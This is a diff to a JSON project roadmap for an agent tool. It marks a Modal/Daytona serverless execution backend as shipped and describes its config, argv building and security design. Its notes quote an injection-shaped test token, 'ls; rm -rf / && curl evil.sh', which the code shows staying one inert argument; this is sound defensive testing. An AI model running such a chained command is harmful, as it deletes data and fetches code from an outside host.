@@ -13333,7 +13333,7 @@
       "id": "BACKEND-SERVERLESS",
       "track": "Operator",
       "title": "Serverless backend — Modal/Daytona hibernate-when-idle persistence",
-      "status": "next",
+      "status": "shipped",
       "size": "L",
       "summary": "Serverless execution backend (Modal and/or Daytona): the environment hibernates when idle and wakes on demand, costing near-nothing between sessions — the '$5 VPS or serverless' run-anywhere endpoint. SEQUENCED AFTER pure-infra (Docker/SSH) per DECISIONS 2026-06-19. Carries a rule-zero sub-decision: data leaves the user's machines to a third party (user's own account + keys, opt-in, kernel still gates) — resolve before building.",
       "done": "An agent session runs on Modal or Daytona, hibernates idle and resumes on demand, kernel-gated; the data-residency sub-decision is recorded in DECISIONS; opt-in only, never a default; tests cover the adapter.",
@@ -13343,7 +13343,9 @@
       "after": [
         "BACKEND-DOCKER",
         "VANTA-SSH-SESSION"
-      ]
+      ],
+      "updated": "2026-06-21",
+      "notes": "Pure ServerlessProvider modal|daytona + zod ServerlessConfigSchema{provider,app?,image?,idleTimeoutSec?(int>0),network?} + resolveServerlessConfig (VANTA_SERVERLESS_PROVIDER + APP/IMAGE/IDLE_SEC/NET; no provider -> {ok:false,reason}) + buildServerlessArgs (DISCRETE argv: modal run [app] --timeout N [--image I] -- baseCmd / daytona exec [app] [--image I] --idle N [--no-network] -- baseCmd) + serverlessBackendEnabled (VANTA_EXEC_BACKEND=serverless AND a provider) + hibernatePolicy ({idleTimeoutSec, hibernates}; default 300s, non-positive disables) + SERVERLESS_CLI. SECURITY: argv ALWAYS an array never shell-interpolated — an injection-shaped baseCmd token (ls; rm -rf / && curl evil.sh) survives as ONE discrete element (asserted); kernel assess() runs UPSTREAM of wrapExec — a serverless backend changes WHERE a command runs NEVER WHETHER its allowed (mirrors BACKEND-DOCKER). NO Modal/Daytona SDK dep; live modal/daytona CLI = boundary; no cloud secret literal (gitleaks-safe). Built+tested; wire = exec/backend wrapExec adds a serverless case (serverlessBackendEnabled -> resolveServerlessConfig -> serverlessCliAvailable -> buildServerlessArgs; CLI absent/refused -> clean fallback to maybeSandbox/local) (named). Not configured = local/docker fallback."
     },
     {
       "id": "SCRIPT-RPC-PIPELINE",
